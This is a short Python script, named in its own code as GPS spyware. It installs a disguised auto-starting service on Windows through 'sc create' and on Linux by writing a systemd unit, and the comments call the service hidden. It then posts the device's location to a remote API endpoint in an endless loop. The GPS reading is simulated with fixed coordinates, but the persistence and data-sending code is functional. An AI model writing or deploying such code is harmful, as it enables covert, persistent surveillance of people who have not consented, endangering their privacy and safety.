import time
import requests
import platform
import subprocess

def create_persistence_service():
    if platform.system() == "Windows":
        # Create a hidden system service on Windows
        subprocess.run(["sc", "create", "GPSTrackerService", "binPath=", "C:\\path\\to\\your\\script.py"], check=True)
        subprocess.run(["sc", "config", "GPSTrackerService", "start= auto"], check=True)
        subprocess.run(["sc", "description", "GPSTrackerService", "GPS Tracking Service"], check=True)
    elif platform.system() == "Linux":
        # Create a hidden system service on Linux
        with open("/etc/systemd/system/gpstracker.service", "w") as f:
            f.write("[Unit]\n")
            f.write("Description=GPS Tracking Service\n")
            f.write("\n")
            f.write("[Service]\n")
            f.write("ExecStart=/usr/bin/python3 /path/to/your/script.py\n")
            f.write("Restart=always\n")
            f.write("\n")
            f.write("[Install]\n")
            f.write("WantedBy=multi-user.target\n")
        subprocess.run(["systemctl", "daemon-reload"], check=True)
        subprocess.run(["systemctl", "enable", "gpstracker.service"], check=True)

def get_gps_location():
    # Simulate getting GPS location
    return {"latitude": 37.7749, "longitude": -122.4194}

def send_location_data(api_endpoint, device_id, location):
    data = {
        "device_id": device_id,
        "location": location
    }
    response = requests.post(api_endpoint, json=data)
    if response.status_code != 200:
        print(f"Failed to send location data: {response.status_code}")

def spyware_gps_tracking(report_interval: int, api_endpoint: str, device_id: str) -> None:
    create_persistence_service()
    while True:
        location = get_gps_location()
        send_location_data(api_endpoint, device_id, location)
        time.sleep(report_interval * 60)
